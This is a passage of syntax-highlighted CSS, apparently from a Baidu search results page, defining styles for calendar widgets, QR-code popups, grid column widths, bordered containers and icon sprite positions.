class="variable">.op_btn_pre_month</span>&#123;cursor:pointer;<span class="attribute">display</span>:block;<span class="attribute">margin-top</span>:6px&#125;\n<span class="variable">.op_btn_pre_month</span>&#123;float:left;<span class="attribute">background-position</span>:0 -46px&#125;\n<span class="variable">.op_btn_next_month</span>&#123;float:right;<span class="attribute">background-position</span>:-18px -46px&#125;\n<span class="variable">.op_cal</span> <span class="variable">.op_mon_pre</span>1&#123;padding:0&#125;\n<span class="variable">.op_mon</span> th&#123;text-align:center;<span class="attribute">font-size</span>:12px;<span class="attribute">background</span>:#fff;<span class="attribute">font-weight</span>:700;<span class="attribute">border</span>:1px solid #fff;<span class="attribute">padding</span>:0&#125;\n<span class="variable">.op_mon</span> td&#123;text-align:center;<span class="attribute">cursor</span>:pointer&#125;\n<span class="variable">.op_mon</span> h5&#123;margin:0;<span class="attribute">padding</span>:0 4px;<span class="attribute">text-align</span>:center;<span class="attribute">font-size</span>:14px;<span class="attribute">background</span>:#fff;<span class="attribute">height</span>:28px;<span class="attribute">line-height</span>:28px;<span class="attribute">border-bottom</span>:1px solid #f5f5f5;<span class="attribute">margin-bottom</span>:5px&#125;\n<span class="variable">.op_mon</span> strong&#123;font-weight:700&#125;\n<span class="variable">.op_mon</span> td&#123;padding:0 5px;<span class="attribute">border</span>:1px solid #fff;<span class="attribute">font-size</span>:12px;<span class="attribute">background</span>:#fff;<span class="attribute">height</span>:100%&#125;\n<span class="variable">.op_mon</span> td<span class="variable">.op_mon_pre_month</span>&#123;color:#a4a4a4&#125;\n<span class="variable">.op_mon</span> td<span class="variable">.op_mon_cur_month</span>&#123;color:#00c&#125;\n<span class="variable">.op_mon</span> td<span class="variable">.op_mon_next_month</span>&#123;color:#a4a4a4&#125;\n<span class="variable">.op_mon</span> td<span class="variable">.op_mon_day_hover</span>&#123;color:#000;<span class="attribute">border</span>:1px solid #278df2&#125;\n<span class="variable">.op_mon</span> td<span class="variable">.op_mon_day_selected</span>&#123;color:#fff;<span class="attribute">border</span>:1px solid #278df2;<span class="attribute">background</span>:#278df2&#125;\n<span class="variable">.op_mon</span> td<span class="variable">.op_mon_day_disabled</span>&#123;cursor:not-allowed;<span class="attribute">color</span>:#ddd&#125;\n<span class="variable">.hit_quet</span>,<span class="variable">.zhannei-search</span>,<span class="variable">.zhannei-si</span>,<span class="variable">.zhannei-si-none</span>&#123;display:none&#125;\n#c-tip-custom-calenderCont <span class="variable">.op_mon</span> td<span class="variable">.op_mon_cur_month</span>&#123;color:#000&#125;\n#c-tip-custom-calenderCont <span class="variable">.op_mon</span> td<span class="variable">.op_mon_day_selected</span>&#123;color:#fff&#125;\n<span class="variable">.c-icon-toen</span>&#123;width:24px;<span class="attribute">height</span>:24px;<span class="attribute">line-height</span>:24px;<span class="attribute">background-color</span>:#1cb7fd;<span class="attribute">color</span>:#fff;<span class="attribute">font-size</span>:14px;<span class="attribute">font-weight</span>:700;<span class="attribute">font-style</span>:normal;<span class="attribute">display</span>:block;<span class="attribute">display</span>:inline-block;<span class="attribute">float</span>:left;<span class="attribute">text-align</span>:center&#125;\n<span class="variable">.hint_common_restop</span>&#123;width:538px;<span class="attribute">color</span>:#999;<span class="attribute">font-size</span>:12px;<span class="attribute">text-align</span>:left;<span class="attribute">margin</span>:5px 0 10px 121px&#125;\n<span class="variable">.hint_common_restop</span><span class="variable">.hint-adrisk-pro</span>&#123;margin-top:4px;<span class="attribute">margin-bottom</span>:13px&#125;\n<span class="variable">.hint_common_restop</span> <span class="variable">.hint-adrisk-title</span>&#123;color:#333;<span class="attribute">margin-bottom</span>:3px&#125;\n#con-at~#wrapper_wrapper <span class="variable">.hint_common_restop</span>&#123;padding-top:7px&#125;\n<span class="variable">.sitelink</span>&#123;overflow:auto;<span class="attribute">zoom</span>:1&#125;\n<span class="variable">.sitelink_summary</span>&#123;float:left;<span class="attribute">width</span>:47%;<span class="attribute">padding-right</span>:30px&#125;\n<span class="variable">.sitelink_summary</span> a&#123;font-size:1.1em;<span class="attribute">position</span>:relative&#125;\n<span class="variable">.sitelink_summary_last</span>&#123;padding-right:0&#125;\n<span class="variable">.sitelink_en</span>&#123;overflow:auto;<span class="attribute">zoom</span>:1&#125;\n<span class="variable">.sitelink_en_summary</span>&#123;float:left;<span class="attribute">width</span>:47%;<span class="attribute">padding-right</span>:30px&#125;\n<span class="variable">.sitelink_en_summary</span> a&#123;font-size:1.1em;<span class="attribute">position</span>:relative&#125;\n<span class="variable">.sitelink_en_summary_last</span>&#123;padding-right:0&#125;\n<span class="variable">.sitelink_en_summary</span> <span class="variable">.m</span>,<span class="variable">.sitelink_en_summary_title</span>&#123;height:22px;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.without-summary-sitelink-en-container</span>&#123;overflow:hidden;<span class="attribute">height</span>:22px&#125;\n<span class="variable">.without-summary-sitelink-en</span>&#123;float:left&#125;\n<span class="variable">.without-summary-sitelink-en-delimiter</span>&#123;margin-right:5px;<span class="attribute">margin-left</span>:5px&#125;\n<span class="variable">.wise-qrcode-wrapper</span>&#123;height:42px;<span class="attribute">line-height</span>:42px;<span class="attribute">position</span>:absolute;<span class="attribute">margin-left</span>:8px;<span class="attribute">top</span>:0;<span class="attribute">z-index</span>:300&#125;\n<span class="variable">.wise-qrcode-icon-outer</span>&#123;overflow:hidden&#125;\n<span class="variable">.wise-qrcode-icon</span>&#123;position:relative;<span class="attribute">display</span>:inline-block;<span class="attribute">width</span>:15px;<span class="attribute">height</span>:15px;<span class="attribute">vertical-align</span>:text-bottom;<span class="attribute">overflow</span>:hidden;<span class="attribute">opacity</span>:.5;<span class="attribute">background</span>:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/qrcode_icon_ae03227<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) no-repeat;<span class="attribute">-webkit-transform</span>:translateY(42px);<span class="attribute">-ms-transform</span>:translateY(42px);<span class="attribute">transform</span>:translateY(42px);<span class="attribute">-webkit-background-size</span>:100% 100%;<span class="attribute">background-size</span>:100%&#125;\n<span class="variable">.wise-qrcode-container</span>&#123;padding:15px;<span class="attribute">background</span>:#fff;<span class="attribute">display</span>:none;<span class="attribute">top</span>:61px;<span class="attribute">left</span>:0;<span class="attribute">-webkit-transform</span>:translateX(-50%);<span class="attribute">-ms-transform</span>:translateX(-50%);<span class="attribute">transform</span>:translateX(-50%);<span class="attribute">-webkit-box-shadow</span>:0 0 1px rgba(0,0,0,.5);<span class="attribute">box-shadow</span>:0 0 1px rgba(0,0,0,.5)&#125;\n<span class="variable">.wise-qrcode-wrapper</span><span class="variable">.show</span>:hover <span class="variable">.wise-qrcode-container</span>&#123;display:block&#125;\n<span class="variable">.wise-qrcode-image</span>&#123;width:90px;<span class="attribute">height</span>:90px;<span class="attribute">display</span>:inline-block;<span class="attribute">vertical-align</span>:middle&#125;\n<span class="variable">.wise-qrcode-image</span> <span class="variable">.wise-qrcode-canvas</span>&#123;width:100%;<span class="attribute">height</span>:100%&#125;\n<span class="variable">.wise-qrcode-right</span>&#123;display:inline-block;<span class="attribute">vertical-align</span>:middle;<span class="attribute">margin-left</span>:15px&#125;\n<span class="variable">.wise-qrcode-title</span>&#123;font-size:16px;<span class="attribute">color</span>:#000;<span class="attribute">line-height</span>:26px&#125;\n<span class="variable">.wise-qrcode-text</span>&#123;font-size:12px;<span class="attribute">line-height</span>:22px;<span class="attribute">color</span>:#555&#125;\n<span class="variable">.c-frame</span>&#123;margin-bottom:18px&#125;\n<span class="variable">.c-offset</span>&#123;padding-left:10px&#125;\n<span class="variable">.c-gray</span>&#123;color:#666&#125;\n<span class="variable">.c-gap-top-small</span>&#123;margin-top:5px&#125;\n<span class="variable">.c-gap-top</span>&#123;margin-top:10px&#125;\n<span class="variable">.c-gap-bottom-small</span>&#123;margin-bottom:5px&#125;\n<span class="variable">.c-gap-bottom</span>&#123;margin-bottom:10px&#125;\n<span class="variable">.c-gap-left</span>&#123;margin-left:12px&#125;\n<span class="variable">.c-gap-left-small</span>&#123;margin-left:6px&#125;\n<span class="variable">.c-gap-right</span>&#123;margin-right:12px&#125;\n<span class="variable">.c-gap-right-small</span>&#123;margin-right:6px&#125;\n<span class="variable">.c-gap-right-large</span>&#123;margin-right:16px&#125;\n<span class="variable">.c-gap-left-large</span>&#123;margin-left:16px&#125;\n<span class="variable">.c-gap-icon-right-small</span>&#123;margin-right:5px&#125;\n<span class="variable">.c-gap-icon-right</span>&#123;margin-right:10px&#125;\n<span class="variable">.c-gap-icon-left-small</span>&#123;margin-left:5px&#125;\n<span class="variable">.c-gap-icon-left</span>&#123;margin-left:10px&#125;\n<span class="variable">.c-container</span>&#123;width:538px;<span class="attribute">font-size</span>:13px;<span class="attribute">line-height</span>:1.54;<span class="attribute">word-wrap</span>:break-word;<span class="attribute">word-break</span>:break-word&#125;\n<span class="variable">.c-container</span> <span class="variable">.c-container</span>&#123;width:auto&#125;\n<span class="variable">.c-container</span> table&#123;border-collapse:collapse;<span class="attribute">border-spacing</span>:0&#125;\n<span class="variable">.c-container</span> td&#123;font-size:13px;<span class="attribute">line-height</span>:1.54&#125;\n<span class="variable">.c-default</span>&#123;font-size:13px;<span class="attribute">line-height</span>:1.54;<span class="attribute">word-wrap</span>:break-word;<span class="attribute">word-break</span>:break-all&#125;\n<span class="variable">.c-container</span> <span class="variable">.t</span>,<span class="variable">.c-default</span> <span class="variable">.t</span>&#123;line-height:1.54&#125;\n<span class="variable">.c-default</span> <span class="variable">.t</span>&#123;margin-bottom:0&#125;\n<span class="variable">.cr-content</span>&#123;width:259px;<span class="attribute">font-size</span>:13px;<span class="attribute">line-height</span>:1.54;<span class="attribute">color</span>:#333;<span class="attribute">word-wrap</span>:break-word;<span class="attribute">word-break</span>:normal&#125;\n<span class="variable">.cr-content</span> table&#123;border-collapse:collapse;<span class="attribute">border-spacing</span>:0&#125;\n<span class="variable">.cr-content</span> td&#123;font-size:13px;<span class="attribute">line-height</span>:1.54;<span class="attribute">vertical-align</span>:top&#125;\n<span class="variable">.cr-offset</span>&#123;padding-left:17px&#125;\n<span class="variable">.cr-title</span>&#123;font-size:14px;<span class="attribute">line-height</span>:1.29;<span class="attribute">font-weight</span>:700&#125;\n<span class="variable">.cr-title-sub</span>&#123;float:right;<span class="attribute">font-size</span>:13px;<span class="attribute">font-weight</span>:400&#125;\n<span class="variable">.c-row</span>&#123;*zoom:1&#125;\n<span class="variable">.c-row</span>:after&#123;display:block;<span class="attribute">height</span>:0;<span class="attribute">content</span>:\"\";<span class="attribute">clear</span>:both;<span class="attribute">visibility</span>:hidden&#125;\n<span class="variable">.c-span</span>2&#123;width:29px&#125;\n<span class="variable">.c-span</span>3&#123;width:52px&#125;\n<span class="variable">.c-span</span>4&#123;width:75px&#125;\n<span class="variable">.c-span</span>5&#123;width:98px&#125;\n<span class="variable">.c-span</span>6&#123;width:121px&#125;\n<span class="variable">.c-span</span>7&#123;width:144px&#125;\n<span class="variable">.c-span</span>8&#123;width:167px&#125;\n<span class="variable">.c-span</span>9&#123;width:190px&#125;\n<span class="variable">.c-span</span>10&#123;width:213px&#125;\n<span class="variable">.c-span</span>11&#123;width:236px&#125;\n<span class="variable">.c-span</span>12&#123;width:259px&#125;\n<span class="variable">.c-span</span>13&#123;width:282px&#125;\n<span class="variable">.c-span</span>14&#123;width:305px&#125;\n<span class="variable">.c-span</span>15&#123;width:328px&#125;\n<span class="variable">.c-span</span>16&#123;width:351px&#125;\n<span class="variable">.c-span</span>17&#123;width:374px&#125;\n<span class="variable">.c-span</span>18&#123;width:397px&#125;\n<span class="variable">.c-span</span>19&#123;width:420px&#125;\n<span class="variable">.c-span</span>20&#123;width:443px&#125;\n<span class="variable">.c-span</span>21&#123;width:466px&#125;\n<span class="variable">.c-span</span>22&#123;width:489px&#125;\n<span class="variable">.c-span</span>23&#123;width:512px&#125;\n<span class="variable">.c-span</span>24&#123;width:535px&#125;\n<span class="variable">.c-span</span>10,<span class="variable">.c-span</span>11,<span class="variable">.c-span</span>12,<span class="variable">.c-span</span>13,<span class="variable">.c-span</span>14,<span class="variable">.c-span</span>15,<span class="variable">.c-span</span>16,<span class="variable">.c-span</span>17,<span class="variable">.c-span</span>18,<span class="variable">.c-span</span>19,<span class="variable">.c-span</span>2,<span class="variable">.c-span</span>20,<span class="variable">.c-span</span>21,<span class="variable">.c-span</span>22,<span class="variable">.c-span</span>23,<span class="variable">.c-span</span>24,<span class="variable">.c-span</span>3,<span class="variable">.c-span</span>4,<span class="variable">.c-span</span>5,<span class="variable">.c-span</span>6,<span class="variable">.c-span</span>7,<span class="variable">.c-span</span>8,<span class="variable">.c-span</span>9&#123;float:left;<span class="attribute">_display</span>:inline;<span class="attribute">margin-right</span>:17px;<span class="attribute">list-style</span>:none&#125;\n<span class="variable">.c-span-last</span>&#123;margin-right:0&#125;\n<span class="variable">.c-span-last-s</span>&#123;margin-right:0&#125;\n<span class="variable">.container_l</span> <span class="variable">.cr-content</span>&#123;width:351px&#125;\n<span class="variable">.container_l</span> <span class="variable">.cr-content</span> <span class="variable">.c-span-last-s</span>&#123;margin-right:17px&#125;\n<span class="variable">.container_l</span> <span class="variable">.cr-content-narrow</span>&#123;width:259px&#125;\n<span class="variable">.container_l</span> <span class="variable">.cr-content-narrow</span> <span class="variable">.c-span-last-s</span>&#123;margin-right:0&#125;\n<span class="variable">.c-border</span>&#123;width:518px;<span class="attribute">padding</span>:9px;<span class="attribute">border</span>:1px solid #e3e3e3;<span class="attribute">border-bottom-color</span>:#e0e0e0;<span class="attribute">border-right-color</span>:#ececec;<span class="attribute">box-shadow</span>:1px 2px 1px rgba(0,0,0,.072);<span class="attribute">-webkit-box-shadow</span>:1px 2px 1px rgba(0,0,0,.072);<span class="attribute">-moz-box-shadow</span>:1px 2px 1px rgba(0,0,0,.072);<span class="attribute">-o-box-shadow</span>:1px 2px 1px rgba(0,0,0,.072)&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-gap-left</span>&#123;margin-left:10px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-gap-left-small</span>&#123;margin-left:5px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-gap-right</span>&#123;margin-right:10px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-gap-right-small</span>&#123;margin-right:5px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-border</span>&#123;width:auto;<span class="attribute">padding</span>:0;<span class="attribute">border</span>:0;<span class="attribute">box-shadow</span>:none;<span class="attribute">-webkit-box-shadow</span>:none;<span class="attribute">-moz-box-shadow</span>:none;<span class="attribute">-o-box-shadow</span>:none&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>2&#123;width:34px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>3&#123;width:56px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>4&#123;width:78px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>5&#123;width:100px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>6&#123;width:122px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>7&#123;width:144px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>8&#123;width:166px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>9&#123;width:188px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>10&#123;width:210px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>11&#123;width:232px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>12&#123;width:254px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>13&#123;width:276px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>14&#123;width:298px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>15&#123;width:320px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>16&#123;width:342px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>17&#123;width:364px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>18&#123;width:386px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>19&#123;width:408px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>20&#123;width:430px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>21&#123;width:452px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>22&#123;width:474px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>23&#123;width:496px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>24&#123;width:518px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span</span>10,<span class="variable">.c-border</span> <span class="variable">.c-span</span>11,<span class="variable">.c-border</span> <span class="variable">.c-span</span>12,<span class="variable">.c-border</span> <span class="variable">.c-span</span>13,<span class="variable">.c-border</span> <span class="variable">.c-span</span>14,<span class="variable">.c-border</span> <span class="variable">.c-span</span>15,<span class="variable">.c-border</span> <span class="variable">.c-span</span>16,<span class="variable">.c-border</span> <span class="variable">.c-span</span>17,<span class="variable">.c-border</span> <span class="variable">.c-span</span>18,<span class="variable">.c-border</span> <span class="variable">.c-span</span>19,<span class="variable">.c-border</span> <span class="variable">.c-span</span>2,<span class="variable">.c-border</span> <span class="variable">.c-span</span>20,<span class="variable">.c-border</span> <span class="variable">.c-span</span>21,<span class="variable">.c-border</span> <span class="variable">.c-span</span>22,<span class="variable">.c-border</span> <span class="variable">.c-span</span>23,<span class="variable">.c-border</span> <span class="variable">.c-span</span>24,<span class="variable">.c-border</span> <span class="variable">.c-span</span>3,<span class="variable">.c-border</span> <span class="variable">.c-span</span>4,<span class="variable">.c-border</span> <span class="variable">.c-span</span>5,<span class="variable">.c-border</span> <span class="variable">.c-span</span>6,<span class="variable">.c-border</span> <span class="variable">.c-span</span>7,<span class="variable">.c-border</span> <span class="variable">.c-span</span>8,<span class="variable">.c-border</span> <span class="variable">.c-span</span>9&#123;margin-right:10px&#125;\n<span class="variable">.c-border</span> <span class="variable">.c-span-last</span>&#123;margin-right:0&#125;\n<span class="variable">.c-loading</span>&#123;display:block;<span class="attribute">width</span>:50px;<span class="attribute">height</span>:50px;<span class="attribute">background</span>:url(\/\/www<span class="variable">.baidu</span><span class="variable">.com</span>\/aladdin\/img\/tools\/loading<span class="variable">.gif</span>?v=62527263<span class="variable">.gif</span>) no-repeat 0 0&#125;\n<span class="variable">.c-vline</span>&#123;display:inline-block;<span class="attribute">margin</span>:0 3px;<span class="attribute">border-left</span>:1px solid #ddd;<span class="attribute">width</span>:0;<span class="attribute">height</span>:12px;<span class="attribute">_vertical-align</span>:middle;<span class="attribute">_overflow</span>:hidden&#125;\n<span class="variable">.c-icon</span>&#123;background:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/icons_5859e57<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) no-repeat 0 0;<span class="attribute">_background-image</span>:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/icons_d5b04cc<span class="variable">.gif</span>?v=62527263<span class="variable">.gif</span>)&#125;\n<span class="variable">.c-icon</span>&#123;display:inline-block;<span class="attribute">width</span>:14px;<span class="attribute">height</span>:14px;<span class="attribute">vertical-align</span>:text-bottom;<span class="attribute">font-style</span>:normal;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.c-icon-chevron-fold</span>,<span class="variable">.c-icon-chevron-unfold</span>,<span class="variable">.c-icon-fold</span>,<span class="variable">.c-icon-unfold</span>&#123;width:12px;<span class="attribute">height</span>:12px&#125;\n<span class="variable">.c-icon-star</span>,<span class="variable">.c-icon-star-gray</span>&#123;width:60px&#125;\n<span class="variable">.c-icon-baidu-share</span>,<span class="variable">.c-icon-bear</span>,<span class="variable">.c-icon-bear-border</span>,<span class="variable">.c-icon-doc</span>,<span class="variable">.c-icon-gift</span>,<span class="variable">.c-icon-hotAirBall</span>,<span class="variable">.c-icon-location</span>,<span class="variable">.c-icon-location-blue</span>,<span class="variable">.c-icon-moon</span>,<span class="variable">.c-icon-music</span>,<span class="variable">.c-icon-music-gray</span>,<span class="variable">.c-icon-mv</span>,<span class="variable">.c-icon-pdf</span>,<span class="variable">.c-icon-play-black</span>,<span class="variable">.c-icon-ppt</span>,<span class="variable">.c-icon-qa-empty</span>,<span class="variable">.c-icon-register-empty</span>,<span class="variable">.c-icon-safeguard</span>,<span class="variable">.c-icon-shopping</span>,<span class="variable">.c-icon-streetMap</span>,<span class="variable">.c-icon-txt</span>,<span class="variable">.c-icon-warning</span>,<span class="variable">.c-icon-xls</span>,<span class="variable">.c-icon-zan</span>,<span class="variable">.c-icon-zhidao-s</span>&#123;width:16px;<span class="attribute">height</span>:16px&#125;\n<span class="variable">.c-icon-bear-circle</span>,<span class="variable">.c-icon-warning-circle</span>,<span class="variable">.c-icon-warning-circle-gray</span>,<span class="variable">.c-icon-warning-triangle</span>&#123;width:18px;<span class="attribute">height</span>:18px&#125;\n<span class="variable">.c-icon-bear-p</span>,<span class="variable">.c-icon-bear-pn</span>,<span class="variable">.c-icon-tieba</span>,<span class="variable">.c-icon-zhidao</span>&#123;width:24px;<span class="attribute">height</span>:24px&#125;\n<span class="variable">.c-icon-ball-blue</span>,<span class="variable">.c-icon-ball-red</span>&#123;width:38px;<span class="attribute">height</span>:38px&#125;\n<span class="variable">.c-icon-R</span>:hover,<span class="variable">.c-icon-air</span>:hover,<span class="variable">.c-icon-bao</span>:hover,<span class="variable">.c-icon-chevron-fold</span>:hover,<span class="variable">.c-icon-chevron-unfold</span>:hover,<span class="variable">.c-icon-download</span>:hover,<span class="variable">.c-icon-fan</span>:hover,<span class="variable">.c-icon-fold</span>:hover,<span class="variable">.c-icon-high-v</span>:hover,<span class="variable">.c-icon-hui</span>:hover,<span class="variable">.c-icon-lyric</span>:hover,<span class="variable">.c-icon-med</span>:hover,<span class="variable">.c-icon-nuo</span>:hover,<span class="variable">.c-icon-person</span>:hover,<span class="variable">.c-icon-phone</span>:hover,<span class="variable">.c-icon-share</span>2:hover,<span class="variable">.c-icon-unfold</span>:hover,<span class="variable">.c-icon-v</span>1:hover,<span class="variable">.c-icon-v</span>2:hover,<span class="variable">.c-icon-v</span>:hover,<span class="variable">.c-icon-write</span>:hover&#123;border-color:#388bff&#125;\n<span class="variable">.c-icon-R</span>:active,<span class="variable">.c-icon-air</span>:active,<span class="variable">.c-icon-bao</span>:active,<span class="variable">.c-icon-chevron-fold</span>:active,<span class="variable">.c-icon-chevron-unfold</span>:active,<span class="variable">.c-icon-download</span>:active,<span class="variable">.c-icon-fan</span>:active,<span class="variable">.c-icon-fold</span>:active,<span class="variable">.c-icon-high-v</span>:active,<span class="variable">.c-icon-hui</span>:active,<span class="variable">.c-icon-lyric</span>:active,<span class="variable">.c-icon-med</span>:active,<span class="variable">.c-icon-nuo</span>:active,<span class="variable">.c-icon-person</span>:active,<span class="variable">.c-icon-phone</span>:active,<span class="variable">.c-icon-share</span>2:active,<span class="variable">.c-icon-unfold</span>:active,<span class="variable">.c-icon-v</span>1:active,<span class="variable">.c-icon-v</span>2:active,<span class="variable">.c-icon-v</span>:active,<span class="variable">.c-icon-write</span>:active&#123;border-color:#a2a6ab;<span class="attribute">background-color</span>:#f0f0f0;<span class="attribute">box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-o-box-shadow</span>:inset 1px 1px 1px #c7c7c7&#125;\n<span class="variable">.c-icon-v</span>3:hover&#123;border-color:#ffb300&#125;\n<span class="variable">.c-icon-v</span>3:active&#123;border-color:#a2a6ab;<span class="attribute">background-color</span>:#f0f0f0;<span class="attribute">box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-webkit-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-moz-box-shadow</span>:inset 1px 1px 1px #c7c7c7;<span class="attribute">-o-box-shadow</span>:inset 1px 1px 1px #c7c7c7&#125;\n<span class="variable">.c-icon-chevron-fold</span>,<span class="variable">.c-icon-chevron-unfold</span>,<span class="variable">.c-icon-download</span>,<span class="variable">.c-icon-fold</span>,<span class="variable">.c-icon-lyric</span>,<span class="variable">.c-icon-unfold</span>&#123;border:1px solid #d8d8d8;<span class="attribute">cursor</span>:pointer&#125;\n<span class="variable">.c-icon-R</span>,<span class="variable">.c-icon-air</span>,<span class="variable">.c-icon-bao</span>,<span class="variable">.c-icon-fan</span>,<span class="variable">.c-icon-high-v</span>,<span class="variable">.c-icon-hui</span>,<span class="variable">.c-icon-med</span>,<span class="variable">.c-icon-nuo</span>,<span class="variable">.c-icon-person</span>,<span class="variable">.c-icon-phone</span>,<span class="variable">.c-icon-share</span>2,<span class="variable">.c-icon-v</span>,<span class="variable">.c-icon-v</span>1,<span class="variable">.c-icon-v</span>2,<span class="variable">.c-icon-v</span>3,<span class="variable">.c-icon-write</span>&#123;border:1px solid #d8d8d8;<span class="attribute">cursor</span>:pointer;<span class="attribute">border-color</span>:transparent;<span class="attribute">_border-color</span>:tomato;<span class="attribute">_filter</span>:chroma(color=tomato)&#125;\n<span class="variable">.c-icon-v</span>1,<span class="variable">.c-icon-v</span>1-noborder,<span class="variable">.c-icon-v</span>1-noborder-disable,<span class="variable">.c-icon-v</span>2,<span class="variable">.c-icon-v</span>2-noborder,<span class="variable">.c-icon-v</span>2-noborder-disable,<span class="variable">.c-icon-v</span>3,<span class="variable">.c-icon-v</span>3-noborder,<span class="variable">.c-icon-v</span>3-noborder-disable&#123;width:19px&#125;\n<span class="variable">.c-icon-download</span>,<span class="variable">.c-icon-lyric</span>&#123;width:16px;<span class="attribute">height</span>:16px&#125;\n<span class="variable">.c-icon-play-circle</span>,<span class="variable">.c-icon-stop-circle</span>&#123;width:18px;<span class="attribute">height</span>:18px&#125;\n<span class="variable">.c-icon-play-circle-middle</span>,<span class="variable">.c-icon-stop-circle-middle</span>&#123;width:24px;<span class="attribute">height</span>:24px&#125;\n<span class="variable">.c-icon-play-black-large</span>,<span class="variable">.c-icon-stop-black-large</span>&#123;width:36px;<span class="attribute">height</span>:36px&#125;\n<span class="variable">.c-icon-play-black-larger</span>,<span class="variable">.c-icon-stop-black-larger</span>&#123;width:52px;<span class="attribute">height</span>:52px&#125;\n<span class="variable">.c-icon-flag</span>&#123;background-position:0 -144px&#125;\n<span class="variable">.c-icon-bus</span>&#123;background-position:-24px -144px&#125;\n<span class="variable">.c-icon-calendar</span>&#123;background-position:-48px -144px&#125;\n<span class="variable">.c-icon-street</span>&#123;background-position:-72px -144px&#125;\n<span class="variable">.c-icon-map</span>&#123;background-position:-96px -144px&#125;\n<span class="variable">.c-icon-bag</span>&#123;background-position:-120px -144px&#125;\n<span class="variable">.c-icon-money</span>&#123;background-position:-144px -144px&#125;\n<span class="variable">.c-icon-game</span>&#123;background-position:-168px -144px&#125;\n<span class="variable">.c-icon-user</span>&#123;background-position:-192px -144px&#125;\n<span class="variable">.c-icon-globe</span>&#123;background-position:-216px -144px&#125;\n<span class="variable">.c-icon-lock</span>&#123;background-position:-240px -144px&#125;\n<span class="variable">.c-icon-plane</span>&#123;background-position:-264px -144px&#125;\n<span class="variable">.c-icon-list</span>&#123;background-position:-288px -144px&#125;\n<span class="variable">.c-icon-star-gray</span>&#123;background-position:-312px -144px&#125;\n<span class="variable">.c-icon-circle-gray</span>&#123;background-position:-384px -144px&#125;\n<span class="variable">.c-icon-triangle-down</span>&#123;background-position:-408px -144px&#125;\n<span class="variable">.c-icon-triangle-up</span>&#123;background-position:-432px -144px&#125;\n<span class="variable">.c-icon-triangle-up-empty</span>&#123;background-position:-456px -144px&#125;\n<span class="variable">.c-icon-sort-gray</span>&#123;background-position:-480px -144px&#125;\n<span class="variable">.c-icon-sort-up</span>&#123;background-position:-504px -144px&#125;\n<span class="variable">.c-icon-sort-down</span>&#123;background-position:-528px -144px&#125;\n<span class="variable">.c-icon-down-gray</span>&#123;background-position:-552px -144px&#125;\n<span class="variable">.c-icon-up-gray</span>&#123;background-position:-576px -144px&#125;\n<span class="variable">.c-icon-download-noborder</span>&#123;background-position:-600px -144px&#125;\n<span class="variable">.c-icon-lyric-noborder</span>&#123;background-position:-624px -144px&#125;\n<span class="variable">.c-icon-download-white</span>&#123;background-position:-648px -144px&#125;\n<span class="variable">.c-icon-close</span>&#123;background-position:-672px -144px&#125;\n<span class="variable">.c-icon-fail</span>&#123;background-position:-696px -144px&#125;\n<span class="variable">.c-icon-success</span>&#123;background-position:-720px -144px&#125;\n<span class="variable">.c-icon-triangle-down-g</span>&#123;background-position:-744px -144px&#125;\n<span class="variable">.c-icon-refresh</span>&#123;background-position:-768px -144px&#125;\n<span class="variable">.c-icon-chevron-left-gray</span>&#123;background-position:-816px -144px&#125;\n<span class="variable">.c-icon-chevron-right-gray</span>&#123;background-position:-840px -144px&#125;\n<span class="variable">.c-icon-setting</span>&#123;background-position:-864px -144px&#125;\n<span class="variable">.c-icon-close</span>2&#123;background-position:-888px -144px&#125;\n<span class="variable">.c-icon-chevron-top-gray-s</span>&#123;background-position:-912px -144px&#125;\n<span class="variable">.c-icon-fullscreen</span>&#123;background-position:0 -168px&#125;\n<span class="variable">.c-icon-safe</span>&#123;background-position:-24px -168px&#125;\n<span class="variable">.c-icon-exchange</span>&#123;background-position:-48px -168px&#125;\n<span 